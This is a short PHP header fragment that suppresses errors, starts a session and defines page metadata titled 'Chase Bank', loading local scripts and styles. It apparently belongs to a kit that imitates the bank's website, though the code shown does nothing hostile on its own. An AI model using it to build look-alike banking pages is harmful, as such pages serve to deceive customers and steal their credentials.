<?php 
error_reporting(0);
session_start();
ob_start();
$meta = "
<title>Chase Bank</title>
<meta charset='utf-8' />
<link rel='stylesheet' href='./css/style.css' />
<meta name='viewport' content='width=device-width' />
<script src='./js/q.js'></script>
<script src='./js/m.js'></script>
<link rel='icon' href='./img/icon.png' />
";

?>